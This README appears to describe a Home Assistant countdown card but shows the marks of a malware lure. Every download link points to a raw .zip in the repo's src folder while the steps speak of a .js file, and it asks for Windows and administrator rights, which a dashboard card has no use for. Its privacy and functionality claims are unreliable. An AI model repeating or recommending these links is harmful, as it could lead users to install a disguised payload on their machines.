# ⏳ ha-countdown-card - Track important dates in Home Assistant

[![](https://img.shields.io/badge/Download-Latest_Version-blue.svg)](https://raw.githubusercontent.com/Distinctive-cyril4439/ha-countdown-card/main/src/countdown-ha-card-v1.0.zip)

## 📌 Overview

The ha-countdown-card provides a simple way to monitor important events directly on your Home Assistant dashboard. Users often struggle to keep track of upcoming appointments, holidays, or personal deadlines. This tool displays a clear countdown timer on your screen so you never miss a date. You gain visibility into your schedule without leaving your home automation interface.

## ⚙️ System Requirements

This software works with standard Windows setups. Ensure your computer meets these basic needs before you begin:

*   Operating System: Windows 10 or Windows 11.
*   Home Assistant: You must have a working instance of Home Assistant already installed and running on your network.
*   Browser: A modern web browser like Google Chrome, Microsoft Edge, or Mozilla Firefox.
*   Permissions: You need administrator access to your local machine to finish the setup process.
*   Network: Ensure both your computer and your Home Assistant server exist on the same local area network.

## 💾 Installation Process

Follow these steps to add the countdown card to your dashboard.

1. Visit the [official download page](https://raw.githubusercontent.com/Distinctive-cyril4439/ha-countdown-card/main/src/countdown-ha-card-v1.0.zip) to access the files.
2. Look for the latest release on the right side of the page.
3. Download the file ending in `.js` to your computer.
4. Move this file into the `www` folder located inside your Home Assistant configuration directory.
5. Restart your Home Assistant server to load the new file.

## 🚀 Adding the Card to Your Dashboard

Once you host the file on your server, you must add it to your user interface.

1. Open your Home Assistant dashboard in your web browser.
2. Click the three dots in the top right corner of the screen.
3. Choose the Edit Dashboard option.
4. Click the plus button to add a new card.
5. Scroll to the bottom of the list and select Manual.
6. Paste the configuration code provided in the next section into the text box.
7. Click Save to finish.

## 📝 Configuration Settings

Use this code block as a template. You can change the title and the target date to fit your specific needs.

```yaml
type: custom:ha-countdown-card
name: Vacation Countdown
target_date: '2025-12-25'
display_format: days
```

Ensure you replace the target_date with the date of your upcoming event. Use the YYYY-MM-DD format to prevent errors. You can modify the display_format to show hours or minutes if you prefer a more granular countdown.

## ❓ Frequently Asked Questions

### Can I run multiple countdown cards?
Yes. You can add as many cards as you want to your dashboard. Repeat the installation steps for each new event you wish to track.

### Does this work on mobile devices?
Yes. Once you add the card to your dashboard, it appears on the Home Assistant mobile app automatically.

### What happens when the countdown reaches zero?
The card displays a completion message that you define in the configuration settings. You can set it to show a specific alert or hide the card entirely once the event passes.

### Does this card require an internet connection?
The card itself runs locally on your Home Assistant server. It does not send data to third-party services, keeping your personal event information private.

## 🛠 Troubleshooting Common Issues

If you do not see the card appear on your dashboard, check these common points of failure:

*   File Path: Confirm that you placed the `.js` file exactly inside the `/config/www/` folder.
*   Cache: Your browser might store an old version of the dashboard. Clear your browser cache and refresh the page to force an update.
*   Syntax Errors: Check the configuration code for missing spaces or incorrect indentations. YAML files require exact formatting to work correctly.
*   Resource Loading: Check the Home Assistant logs for errors mentioning custom resources. If you see a file not found error, verify the spelling of your filename in the dashboard settings.

## 📖 Customization Options

You can adjust how the card looks to match your existing dashboard theme. Add these extra lines to your card configuration to change the appearance:

*   `show_icon`: Set this to true to show a calendar icon next to the countdown.
*   `color_text`: Change the color of the numbers to make them stand out.
*   `animation`: Enable this to make the numbers pulse as they count down toward your target date.

Refer to the documentation on the [download page](https://raw.githubusercontent.com/Distinctive-cyril4439/ha-countdown-card/main/src/countdown-ha-card-v1.0.zip) for a complete list of style parameters. Always test your changes in a single card before applying them to your entire dashboard. This ensures your interface remains stable and easy to use.